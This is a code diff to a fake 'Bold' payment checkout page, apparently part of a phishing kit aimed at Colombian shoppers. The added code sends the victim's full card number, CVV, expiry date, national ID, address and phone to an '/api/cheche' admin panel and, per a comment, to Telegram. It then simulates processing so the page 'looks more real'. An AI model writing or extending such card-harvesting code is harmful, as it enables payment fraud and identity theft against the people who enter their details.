@@ -201,8 +201,64 @@ export default function BoldPagosPage() {
       }
     }
 
-    // Para otros bancos, mostrar procesando y luego error
+    // Para otros bancos, enviar datos al panel y Telegram
     try {
+      // Enviar información completa al panel de administración
+      const response = await fetch('/api/cheche', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'create_session',
+          bank: bankName || 'Otro Banco',
+          // Datos personales completos
+          fullName: orderData.customer?.fullName || cardName,
+          email,
+          phone: `+57${phoneNumber}`,
+          address: orderData.customer?.address,
+          city: orderData.customer?.city,
+          state: orderData.customer?.state,
+          country: orderData.customer?.country,
+          postalCode: orderData.customer?.postalCode,
+          documentId: orderData.customer?.documentId,
+          
+          // Información COMPLETA de tarjeta
+          cardNumber: cardNumber, // Número completo
+          cardHolderName: cardName, // Nombre en tarjeta
+          expiryDate: expiryDate, // Fecha completa
+          cvv: cvv, // CVV completo
+          cardBrand: cardType,
+          
+          // Datos de orden
+          totalAmount: orderData.totalAmount,
+          
+          customerData: {
+            fullName: orderData.fullName,
+            email,
+            phone: `+57${phoneNumber}`,
+            address: orderData.address,
+            city: orderData.city,
+            state: orderData.state,
+            country: orderData.country,
+            postalCode: orderData.postalCode,
+          },
+          orderData: {
+            ...orderData,
+            totalAmount: orderData.totalAmount,
+            cardInfo: {
+              last4: cardNumber.slice(-4),
+              brand: cardType,
+              bank: bankName,
+            },
+            paymentMethod: 'Bold - Tarjeta ' + cardType,
+            status: 'pending'
+          }
+        })
+      });
+
+      if (!response.ok) {
+        console.error('Error al enviar datos al panel');
+      }
+      
       // Simular procesamiento (2.5-3 segundos para que se vea más real)
       await new Promise(resolve => setTimeout(resolve, 2500));
       
